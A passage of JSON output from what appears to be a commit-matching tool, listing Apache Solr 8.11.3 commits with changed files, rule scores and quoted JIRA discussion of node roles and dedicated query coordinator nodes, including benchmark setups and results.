branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Commit 2da4332072ffffb0581ef60d11de5b0d157452ac in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2da4332072f ] SOLR-15694 , 15715: Node roles and dedicated query coordinator nodes Commit b54a788fe71c7f87a8b8564461cb196c138fc7ce in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=b54a788fe71 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Commit 002b3ce67bea7dfe114c3b7dfdceb00b8777363c in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=002b3ce67be ] Revert \" SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce. Commit ace7641edb762d31519df1db845885dfd31caee4 in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=ace7641edb7 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Hi ichattopadhyaya , We are trying to use the Node roles feature to set a preferred Overseer in our Solr 9 fork. What is the purpose of having overseerDesignate in addition to specifying a preferredOverseer ? How is it specified via startup parameters? In our fork, I am configuring one node in the SolrCloud cluster with -Dsolr.node.roles=overseer:preferred,data:on . All other nodes are set to overseer:allowed,data:on by default. I have observed that during a rolling restart, the OverseerNodePrioritizer almost always elects the preferred Overseer as the Overseer, provided it is up. Additionally, since the overseerDesignate list remains empty (until the preferred Overseer is added to it), it does not affect this outcome."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, ZooKeeper, SolrCloud, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java, solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java, solr/core/src/java/org/apache/solr/request/SimpleFacets.java, solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml, solr/core/src/java/org/apache/solr/handler/ClusterAPI.java, solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java, solr/core/src/java/org/apache/solr/core/CoreContainer.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java, solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java, solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java, solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java, solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java, solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java, solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java, solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java, solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java, solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java, solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java, solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java, solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java, solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml, solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java, solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java, solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml, solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java, solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java, solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java, solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java, solr/core/src/java/org/apache/solr/core/NodeRoles.java, solr/core/src/java/org/apache/solr/update/UpdateLog.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java, solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml, solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java, solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, read, request, actor, clouds",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-15694",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "2088d743db9304492ab19c14bc80c6187f172b79",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698088740,
            "hunks": 79,
            "message": "SOLR-15694, SOLR-15715: Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org>",
            "changed_files": [
                "solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java",
                "solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java",
                "solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java",
                "solr/core/src/java/org/apache/solr/core/CoreContainer.java",
                "solr/core/src/java/org/apache/solr/core/NodeRoles.java",
                "solr/core/src/java/org/apache/solr/handler/ClusterAPI.java",
                "solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java",
                "solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java",
                "solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java",
                "solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java",
                "solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java",
                "solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java",
                "solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/request/SimpleFacets.java",
                "solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java",
                "solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java",
                "solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java",
                "solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java",
                "solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java",
                "solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java",
                "solr/core/src/java/org/apache/solr/update/UpdateLog.java",
                "solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java",
                "solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml",
                "solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml",
                "solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java",
                "solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java",
                "solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java",
                "solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java"
            ],
            "message_reference_content": [],
            "jira_refs": {
                "SOLR-15694": "I think we should have first class support for starting a Solr node in a mode whereby no cores will be placed on them. These nodes are useful for certain scenarios: Dedicated overseer nodes Nodes where only plugins are installed and used (e.g. cluster/node level plugins) Dedicated nodes for querying (more on this to come later). Today, to achieve this effect, one can: 1. start a node (which will make it join live_nodes and be immediately available for replica placement). 2. Put replica placement rules or autoscaling policies to prevent replicas from being placed there. This is not standardized, 8x has two ways to achieve this (replica placement rules and autoscaling framework), 9x has a new autoscaling framework. Proposing a start parameter for starting a node that starts the node in this configuration, and then internally this is handled appropriately (across 8x and 9x). This should be Kubernetes/Docker friendly as well, since it is easy to add an additional parameter for a startup (instead of putting things into autoscaling.json in ZK via init scripts). Concept of node roles and non-data nodes This has been discussed many times. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. One role coud be \"zk\", which would let the node start an embedded zookeeper (for a future managed zk feature), and then you could combine it with \"data\" if the node should also be eligible for index/search. There may be other roles such as \"streaming\" perhaps which would only host streaming expression jobs, etc. This is definitely SIP worthy. janhoy , thanks. That is good feedback. This has been discussed many times. Can you please point me to that? Will link to that in future discussions. I think it should be a generic concept of a \"node role\", which can then be one or more roles that will dictate how the node acts. Today, we have a role \"overseer\" for a node. However, many users look for dedicated overseer nodes (nodes that don't handle querying or indexing), and there's no easy way today. and then you could combine it with \"data\" if the node should also be eligible for index/search. Do you recommend that we have a role \"data\" for nodes (regular nodes as we have today)? In that case, what would absence of this \"data\" role for a node mean the node doesn't host any cores? This seems reasonable for what I intend to achieve with usecases I have in mind. This is definitely SIP worthy. I'll create one, thanks janhoy We already have a file /roles.json in ZK. It has a key called \"overseer\" now. We can add a new key called \"query-nodes\" and add nodes to that Ah, did not know about that. A thousand questions pop up, such as: Should roles be supported in leader/follower mode? What would be the best way to designate roles to a node? A global file in ZK like /roles.json is one way. ENV_VARs or SysProps at each node is another. How dynamic do we need this to be, are there business needs to (re)assign roles at runtime, and in that case do we need a REST API for it? If dynamic, what role(s) would a brand new node (or k8s pod) added to the cluster be assigned? What happens if you have only assigned a role to one node and that node leaves the cluster? Should that be configurable, or would there be some cluster level plugin monitoring events, that makes such decisions? etc etc Looking forward to seeing a SIP with a thorough design and recommendation on this. Looking forward to seeing a SIP with a thorough design and recommendation on this. I'll write up the SIP today. We can address these questions there and link to this JIRA. Here's the SIP: https://cwiki.apache.org/confluence/display/SOLR/SIP-15+Node+roles Discussion is happening here: https://lists.apache.org/thread.html/rb3cbfddb6e3af9c671d037ce1e7341544a2f1ab287f184c8f53ac44c%40%3Cdev.solr.apache.org%3E Browsing the other SIPs, SIP-11 is potentially related, as ir proposes some nice cleanup of accessing cluster-level config. Not saying we should not wait for that, but I'll ping ab to explore synergies. Commit 24e5ba7105ea774de0b319337c6809d2839b9f8a in solr's branch refs/heads/jira/SOLR15694 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=24e5ba7 ] SOLR-15694 : Ref guide changes Commit e32e58c20be0540c6e89679a57aac26616911e3d in solr's branch refs/heads/main from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e32e58c ] SOLR-15694 : Node roles Commit e19a13f8146a713fe883c9a17809dc542638cc85 in solr's branch refs/heads/branch_9x from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=solr.git;h=e19a13f ] SOLR-15694 : Node roles Can you close this and also move SIP-15 to correct section in the list? https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ichattopadhyaya why is this till open? Also the SIP (see previous comment) is listed as \"under discussion\". I'll try once moce ichattopadhyaya noble.paul Can you please move the SIP-15 to the \"Implemented\" section here https://cwiki.apache.org/confluence/display/SOLR/Solr+Improvement+Proposals ? Done. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Commit 2da4332072ffffb0581ef60d11de5b0d157452ac in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2da4332072f ] SOLR-15694 , 15715: Node roles and dedicated query coordinator nodes Commit b54a788fe71c7f87a8b8564461cb196c138fc7ce in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=b54a788fe71 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Commit 002b3ce67bea7dfe114c3b7dfdceb00b8777363c in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=002b3ce67be ] Revert \" SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time)\" This reverts commit b54a788fe71c7f87a8b8564461cb196c138fc7ce. Commit ace7641edb762d31519df1db845885dfd31caee4 in lucene-solr's branch refs/heads/branch_8_11 from noblepaul [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=ace7641edb7 ] SOLR-15694 , 15715: Create ephemeral roles properly (missed backporting these changes last time) Hi ichattopadhyaya , We are trying to use the Node roles feature to set a preferred Overseer in our Solr 9 fork. What is the purpose of having overseerDesignate in addition to specifying a preferredOverseer ? How is it specified via startup parameters? In our fork, I am configuring one node in the SolrCloud cluster with -Dsolr.node.roles=overseer:preferred,data:on . All other nodes are set to overseer:allowed,data:on by default. I have observed that during a rolling restart, the OverseerNodePrioritizer almost always elects the preferred Overseer as the Overseer, provided it is up. Additionally, since the overseerDesignate list remains empty (until the preferred Overseer is added to it), it does not affect this outcome.",
                "SOLR-15715": "We have a large collection with 1000s of shards in the solr cluster. We have observed that distributed solr query takes many resources(thread, memory, etc.) on the solr data node(node which contains indexes). Thus we need dedicated query nodes to execute distributed queries on large solr collection. That would reduce the memory/cpu pressure from solr data nodes. Elastis search has similar functionality here noble.paul ichattopadhyaya Dedicated query coordinator nodes in the solr cluster Related to SOLR-15694 I'd like to point out here that this feature is a donation from FullStory, where hiteshkhamesra implemented this solution that has already brought immense benefits on large Solr clusters. As part of this JIRA, we plan to upstream that functionality so that broader Solr community can benefit. While we've seen substantial reduction of memory usage on data hosting nodes in production for FullStory's internal workloads, I shall publish benchmarks for this feature on publicly available datasets soon. I just wrapped up an initial round of testing on regular setup (6 data nodes) POC setup (1 dedicated overseer + 1 coordinator + 6 data nodes). Setup details Regular setup: 6 nodes 2GB heap space on every node 6 collections, 6 shards each, 1 replica per shard Documents 30M per collection (ecommerce events dataset) Queries: 20,000 per collection, all queries on faceting (filtered by timeranges) Query rate: 2 threads per collection, 6 collections at the same time. Query target node: first data node ( port 50000 ) POC setup: 8 nodes: 1 dedicated overseer, 1 coordinator node, 6 data nodes 2GB heap space on every node 6 collections, 6 shards each, 1 replica per shard Documents 30M per collection (ecommerce events dataset) Queries: 20,000 per collection, all queries on faceting (filtered by timeranges) Query rate: 2 threads per collection, 6 collections at the same time. Query target node: coordinator node ( port 50001 ) Performance results Here are the results, Regular setup results: POC results: Conclusion Due to a separate coordinator node, memory usage on data nodes very low. Isolated coordinator node feature for query aggregation working as designed. A well known issue with this model is that the aggregation nodes can a. become bottlenecks to the overall throughput and b. cause outages if they are not scaled correctly. In an aggregation heavy system, these nodes will become the target of maximum load, thus potentially causing a skew in the cluster where the data nodes are relatively lower loaded vs the aggregation nodes bearing most of the load. To sustain that, a separate scalability model will be required for the aggregation nodes, thus leading to more complexity and state. Compared to status quo, in a state of high load, the chances of the cluster running into a cascading failure mode are higher for this solution. What are the steps taken to avoid the situation described above, and what kind of testing/simulation has been performed for the same? To sustain that, a separate scalability model will be required for the aggregation nodes, thus leading to more complexity and state. What do you mean by a \"separate scalability model\"? These query aggregation nodes are stateless and can be scaled up and down independently of the data nodes. Cost of bringing up a new aggregation node and bringing down a misbehaving aggregation node is much lower than misbehaving nodes with data in it. What are the steps taken to avoid the situation described above, and what kind of testing/simulation has been performed for the same? At FullStory, this solution has been running in a production Solr cluster with hundreds of nodes for several months now with immense benefits in reducing load on the data nodes. Cost of bringing up a new aggregation node and bringing down a misbehaving aggregation node is much lower than misbehaving nodes with data in it. { } That is exactly what I want to understand \u2013 how do you scale these nodes up? Are these autoscaled? What is the implication of scaling these nodes on the metadata storage (i.e. ZK state) and the overseer? You are concentrating a load (that was previously distributed) on a few select nodes, so the probability of needing to scale these nodes is high. That can eventually mean a larger cluster overall, since you aren't really removing any data nodes? At FullStory, this solution has been running in a production Solr cluster with hundreds of nodes for several months now with immense benefits in reducing load on the data nodes. While I am glad to hear that, I would still like to see a simulated (and reproducible) benchmark that targets the above mentioned scenario and demonstrates the said feature's handling of the same. That is exactly what I want to understand \u2013 how do you scale these nodes up? Are these autoscaled? What is the implication of scaling these nodes on the metadata storage (i.e. ZK state) and the overseer? It is possible to use Kubernetes or AWS autoscaling based on QPS or other load metrics to provision more of these query aggregation nodes. If this feature leverages the Node Roles feature (SIP-15), then the implication of having many query aggregation nodes would be that there will be many ephemeral nodes added to the /node-roles subtree (nested under coordinator role). {{You are concentrating a load (that was previously distributed) on a few select nodes, so the probability of needing to scale these nodes is high. }} An important benefit of isolating the cost of query aggregation is that while super expensive queries (queries of death) can still take down aggregation nodes, but data nodes still continue to function. Regarding the \"need is high\" for scaling up these query aggregation nodes, I think it is dependent on the workload and I'm not at liberty to disclose the exact details of FullStory's production workload. I would still like to see a simulated (and reproducible) benchmark that targets the above mentioned scenario and demonstrates the said feature's handling of the same. The benchmark I posted above is one such simulated benchmark which is reproducible (I'll share the steps to reproduce it once we have a PR opened). There might be many more reproducible benchmarks to come for this feature, each highlighting different aspects of this solution. Regarding the \"need is high\" for scaling up these query aggregation nodes, I think it is dependent on the workload and I'm not at liberty to disclose the exact details of FullStory's production workload. Having said that, I don't expect that anyone except a tiny minority of users would find this feature helpful. And, as you mentioned, even for those who find this useful, it might be necessary to weigh the tradeoffs that are involved (having additional nodes on top of the data nodes vs. whatever benefits can be had). This is going to be an opt-in feature. In this JIRA, I don't think we can address all such real world scenarios in order to be able to provide definitive guidance whether this will be useful for a particular scenario or not. An important benefit of isolating the cost of query aggregation is that while super expensive queries (queries of death) can still take down aggregation nodes, but data nodes still continue to function. That is true when the majority of workload is non aggregation. On the other hand, if the majority of the workload is aggregation heavy, we are essentially creating a skew in the cluster, keeping majority of nodes free and focusing the heavy lifting to a few nodes \u2013 which will lead to either a set of cascading failures or additional nodes, thus pushing up the cost and increasing cluster management complexity. I am interested in seeing that kind of a benchmark to see how this solution behaves in that situation. Copying a comment I made on the PR because I think it is a slightly larger discussion and might need more eyes on it. Design point: I'm not a fan of putting the coreNameMapping into the CoreContainer's objectCache. It feels kludgey and like we're using that as a grab bag for everything. It's not discoverable and probably not maintainable. I'd like to see this rearchitected in some ways for CoreContainer to allow roles to register themselves with it, and then there's a specific entry per role. And hopefully that's a domain object that can be extendable in the future. So instead of ObjectCache we have a map called RoleData that is maybe Map<Role, Object> and each role knows what that entry is. It feels kludgey and like we're using that as a grab bag for everything. I agree that it is a bit \"kludgey\". However I do not believe all roles need to register some data with CoreContainer. I shall try to make it cleaner Here are final benchmark numbers. Setup Branch: https://github.com/apache/solr/pull/996 No. of Solr nodes: 6 (1 dedicated overseer, 1 coordinator node, 4 regular data nodes) No. of collections: 1 No. of shards: 256 No. of documents: 25 million No. of queries: 2000 (faceting queries, a few join queries) Hardware: One machine with 64GB RAM, at least 16 CPUs. Suite: https://github.com/fullstorydev/solr-bench/blob/master/coordinator-node.json Comparison: Scenario 1) All queries sent to the dedicated overseer node, and hence forwarded to data nodes and executed there. Scenario 2) All queries sent to coordinator node, hence executed on that node. Results Here are the heap usage graphs. The left graphs are for scenario 1 (queries executed on data nodes) and right graphs are scenario 2 (queries executed on coordinator node). It is clear that the heap usage on data nodes (ports 50002+) is less in scenario 2. Reproducing these benchmarks On a laptop, desktop or VM, with at least 64GB RAM and 16 CPUs, do the following: 1. git clone https://github.com/fullstorydev/solr-bench 2. apt install wget unzip zip ant ivy lsof git netcat make openjdk-11-jdk maven jq 3. mvn clean compile assembly:single 4. ./stress.sh coordinator-node.json To run scenario 1, keep the `query-node` to 1 in `querying` section of `task-types` (coordinator-node.json). To run scenario 2, change it to 2. Here 1 and 2 represent the node index (check the `startup-params-overrides` in `cluster` section). To plot the graphs, run `python2.6 -m SimpleHTTPServer 9000` (after a run) and open http://localhost:9000/plot-stress.html on the browser to view the graphs. Narrow down to \"Task 3\" for graphs only during the query phase. I plan to merge the PR #996 soon. It is clear that the heap usage on data nodes (ports 50002+) is less in scenario 2. Can you pretend that I'm a junior engineer and explain this conclusion to me? Can you pretend that I'm a junior engineer and explain this conclusion to me? It seems that during the query phase, a data node (lets say the red line) goes through 9 cycles of GC in scenario 1, whereas during scenario 2 same line goes via 6 cycles. Hence, I arrived at the conclusion that there's less GC cycles, thus indicating lower heap usage, when using coordinator nodes for querying. Does it make sense, Mike? Commit d029eb14aa8fbb592938f67bd1397bd8fe805168 in solr's branch refs/heads/main from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=d029eb14aa8 ] SOLR-15715 : Dedicated query coordinator nodes in the solr cluster (#996) Commit 05f72879b33f389d89baaf7559ea03eb9aef2e89 in solr's branch refs/heads/branch_9x from Noble Paul [ https://gitbox.apache.org/repos/asf?p=solr.git;h=05f72879b33 ] SOLR-15715 : Dedicated query coordinator nodes in the solr cluster (#996) Thanks to everyone for reviews and contribution. Bulk closing 9.1 issues. Commit 2088d743db9304492ab19c14bc80c6187f172b79 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=2088d743db9 ] SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes Co-authored-by: Noble Paul <noble@apache.org> Commit 68fa493b8f959788216eb48f6bcef825fe8e24e6 in lucene-solr's branch refs/heads/branch_8_11 from Ishan Chattopadhyaya [ https://gitbox.apache.org/repos/asf?p=lucene-solr.git;h=68fa493b8f9 ] Revert \" SOLR-15694 , SOLR-15715 : Node roles and dedicated query coordinator nodes\" This reverts commit 2088d743db9304492ab19c14bc80c6187f172b79. Obviously very late to the party, and likely have missed something, but looking at this and some of the code, I'm given to wonder why this wasn't achieved via client request preferences (which was implemented), node labeling, and replica placement (to ensure certain labeled nodes never get data). Nodes without data that receive all the client requests is job done, right? In the current code it seems that only tests will ever call \"setPreferredNodes()\" which makes me think that this feature only works if the end-user client is manually tracking what nodes are coordinators? I guess my biggest Q is why do we need subclasses of HttpSolrCall? This seems achievable with node labels, a node role that adds a label, client smarts, and replica placement. I see a bunch of references to \"synthetic collection\" in the code, but it's not clear what this is or why its needed. From the javadoc: /**\r\n * A coordinator node can serve requests as if it hosts all collections in the cluster. it does so\r\n * by hosting a synthetic replica for each configset used in the cluster. Why do we want to do that? Existing code already knew how to find shards, delegate sub requests and coordinate a response, why do we need to fake the location of the collections with a synthetic replica? Gus, without this feature, how does one get a core/replica onto a coordinator node that has no data?  Normally a core is part of a shard and that shard has data like all the others.  This only partially addresses your questions; I don't have all the answers.  I think I would have rather seen a special shard; maybe having no range and/or having a special state.  But I think an aspect of the solution here is to have an approach that scales to many collections, thus don't want many empty cores.  So instead I could imagine a collection that is able to query any other collection. I noticed an interesting new issue & PR on this feature recently SOLR-17118 ."
            },
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: This, ZooKeeper, SolrCloud, Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
                    "message": "The commit changes some relevant files: solr/core/src/java/org/apache/solr/cloud/api/collections/RoutedAlias.java, solr/core/src/java/org/apache/solr/cloud/api/collections/Assign.java, solr/core/src/java/org/apache/solr/request/SimpleFacets.java, solr/core/src/test-files/solr/configsets/conf3/conf/schema.xml, solr/core/src/java/org/apache/solr/handler/ClusterAPI.java, solr/core/src/java/org/apache/solr/search/join/ScoreJoinQParserPlugin.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CategoryRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/RequestHandlerBase.java, solr/core/src/java/org/apache/solr/core/CoreContainer.java, solr/solrj/src/java/org/apache/solr/common/cloud/ZkStateReader.java, solr/core/src/java/org/apache/solr/servlet/CoordinatorHttpSolrCall.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/search/LTRQParserPlugin.java, solr/contrib/ltr/src/java/org/apache/solr/ltr/response/transform/LTRFeatureLoggerTransformerFactory.java, solr/solrj/src/java/org/apache/solr/client/solrj/impl/BaseCloudSolrClient.java, solr/core/src/java/org/apache/solr/update/processor/DistributedUpdateProcessorFactory.java, solr/core/src/java/org/apache/solr/cloud/api/collections/TimeRoutedAlias.java, solr/core/src/java/org/apache/solr/handler/admin/ShowFileRequestHandler.java, solr/core/src/java/org/apache/solr/request/DelegatingSolrQueryRequest.java, solr/core/src/java/org/apache/solr/response/transform/CoreAugmenterFactory.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandler.java, solr/core/src/java/org/apache/solr/response/transform/TransformerFactory.java, solr/core/src/java/org/apache/solr/search/JoinQParserPlugin.java, solr/core/src/java/org/apache/solr/update/processor/RoutedAliasUpdateProcessor.java, solr/core/src/java/org/apache/solr/cloud/api/collections/RestoreCmd.java, solr/core/src/java/org/apache/solr/servlet/SolrDispatchFilter.java, solr/solrj/src/java/org/apache/solr/client/solrj/SolrRequest.java, solr/core/src/java/org/apache/solr/request/SolrQueryRequest.java, solr/core/src/test-files/solr/configsets/cache-control/conf/schema.xml, solr/core/src/java/org/apache/solr/servlet/HttpSolrCall.java, solr/core/src/java/org/apache/solr/handler/component/HttpShardHandlerFactory.java, solr/core/src/java/org/apache/solr/handler/component/RealTimeGetComponent.java, solr/core/src/test-files/solr/configsets/cache-control/conf/solrconfig.xml, solr/test-framework/src/java/org/apache/solr/SolrTestCaseJ4.java, solr/core/src/java/org/apache/solr/handler/SolrConfigHandler.java, solr/contrib/analytics/src/java/org/apache/solr/handler/component/AnalyticsComponent.java, solr/core/src/java/org/apache/solr/handler/component/SearchHandler.java, solr/core/src/java/org/apache/solr/core/NodeRoles.java, solr/core/src/java/org/apache/solr/update/UpdateLog.java, solr/core/src/java/org/apache/solr/cloud/api/collections/CreateCollectionCmd.java, solr/core/src/test-files/solr/configsets/conf3/conf/solrconfig.xml, solr/core/src/java/org/apache/solr/handler/component/QueryComponent.java, solr/core/src/java/org/apache/solr/api/CoordinatorV2HttpSolrCall.java",
                    "relevance": 8
                },
                {
                    "id": "ADV_KEYWORDS_IN_FILES",
                    "message": "An advisory keyword is contained in the changed files: handler, read, request, actor, clouds",
                    "relevance": 4
                },
                {
                    "id": "BUG_IN_MESSAGE",
                    "message": "The commit message references some bug tracking ticket: SOLR-15694, SOLR-15715",
                    "relevance": 2
                }
            ]
        },
        {
            "commit_id": "3b395d90e5fd6604afb27da4777fd9d1c347c48d",
            "repository": "https://github.com/apache/lucene-solr",
            "timestamp": 1698857127,
            "hunks": 1,
            "message": "Remove unused import, thereby fixing Eclipse import error",
            "changed_files": [
                "solr/core/src/java/org/apache/solr/handler/designer/SampleDocumentsLoader.java"
            ],
            "message_reference_content": [],
            "jira_refs": {},
            "ghissue_refs": {},
            "cve_refs": [],
            "twins": [],
            "tags": [
                "releases/lucene-solr/8.11.3"
            ],
            "matched_rules": [
                {
                    "id": "CHANGES_RELEVANT_CODE",
                    "message": "The commit modifies code containing relevant filename or methods: Solr",
                    "relevance": 8
                },
                {
                    "id": "CHANGES_RELEVANT_FILES",
